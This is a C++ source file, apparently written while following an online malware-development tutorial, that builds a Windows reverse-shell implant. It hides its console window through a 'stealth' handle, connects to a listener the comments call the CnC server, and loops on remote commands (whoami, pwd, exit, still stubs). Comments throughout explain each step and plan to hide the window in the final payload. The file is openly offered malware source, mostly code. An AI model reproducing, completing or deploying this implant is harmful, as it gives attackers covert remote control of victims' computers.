//Ref: https://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-2-1/
//
//C++ Headers

#include <winsock2.h>   //Socket Header
#include <windows.h>    //Win API Header
#include <ws2tcpip.h>   //TCP-IP Header

// C Header
#include <stdio.h>    //Input Output Header

//Debug C++ Header
#include <iostream>   //Input Output Debug Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


/* The #pragma comment will send a signal to the compiler to link the windows32 library Ws_32.lib with our program, winsocket will not work if this directive is not included */

/*
   Headers one by one:

   winsock2.h  : Includes all the TCP/ UDP socket funcitons, structs, and definitions of windows, it must be linked to the Ws_32.lib library for it to compile and work properly, hints the #pragram comment directive

   windows.h : Because we are writing malware for windows we include all the windows api functios

   ws2tcpip.h  : contains all the definitions for tcp/ip protocols to run accordingly

   stdio.h / iostream   : Remember to comment out the #include <iostream> and remove the namespace standard when we compile the final payload else the size of the binary will increase to 1mb

*/


/*
 * We are writing a console application for windows
 * 
 *  We do not want the window to be open till the program ends, so we need to hide it, but we should be able to see the window when we are debugging the malwrae so that we can see what works and what not
 */


void RevShell();
// Main function
int main()
{
    HWND stealth;           //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}
/*

   HWND stealth; creates a window handle, a handle is a data table which contains detailed information about the memory address of the object

Note: In object-oriented languages, one application cannot access another data object or a system resource directly. This, an object must always return a handle which can be used by other applications to manage/modify it. In simple words, a handle is a data table which contians details information about the memroy address of the object. More information on windows data types can be found here: https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types?redirectedfrom=MSDN

AllocConsole(); we allocate a console to the handle which can dispaly or hide the console. 

stealth=findWindowA("ConsoleWindowClass",NULL); we pass the console class's name which is ConsoleWindowClass and store it in the handle named stealth and then hide it by passing it as an argument to the Win API ShowWindow

ShowWindow(stealth,SW_SHOWNORMAL); win API ShowWindow takes the first argument as a handle and the second is an integer value which specifies what should be done with the window. predefined set of integers cna be found here:  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow?redirectedfrom=MSDN  : right now we have it set to SW_SHOWNORMAL which is integer 1 so we can debug the code as we go but in the final code we will change that to SW_HIDE which is integer 0 to hide the console window


RevShell(); this will be our custome function where we will write the code to connect to our CnC server

return 0; because we are writing an int function we need to provide an exit code, 0 means the code ran successfully

*/


// RevShell() This funciton will host our main socket code to connect to our listenr. We do not need to return any value so this is a void function and not an int based function
void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;

        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
          int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
          std::cout << "Command received: " << CommandReceived;
          std::cout << "Length of Command received: " << Result << std::endl;
          if ((strcmp(CommandReceived, "whoami") == 0)) {
            std::cout << "Command parsed: whoami" << std::endl;
            //Execute a whoami() function
          }
          else if ((strcmp(CommandReceived, "pwd") == 0)) {
            std::cout << "Command parsed: pwd" << std::endl;
            //Execute a pwd() function
          }
          else if ((strcmp(CommandReceived, "exit") == 0)) {
            std::cout << "Command parsed: exit";
            std::cout << "Closing connection" << std::endl;
            //Exit gracefully
          }
          else {
            std::cout << "Command not parsed!" << std::endl;
          }
          memset(CommandReceived, 0, sizeof(CommandReceived));
      }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

/*

   WSADATA wsaver; we create a WSADATA object, The WSADATA structure continas details like the version info, system status whether it can connect to a network, maximum sockets it can connect to and other things, we cannot create the socket if we do not initialize the data structure

   WSAStartup(MAKEWORD(2,2), &wsaver); Once the sockets are initialized we need to check whether the compiled version of the sockets is compatible with teh older version of sockets. The version comparison is done using the WSAStartup


   SOCKET tcpsock = socket(AF_INET, SOCKET_STREAM, IPPROTO_TCP); create a socket named tcpsock

   AF_INET - IPV4 addressing schema
   SOCK_STREAM - Stateful connection based streaming
   IPPROTO_TCP - Using TCP/IP protocol

   sockaddr_in addr; Another data struct in windows which needs the values as to what addressing schema to be used, the ip and port to connect to, for us this will be the CnC server's ip and port, for debugging purposes the ip and port should be the one which runs the netcat listener

*/
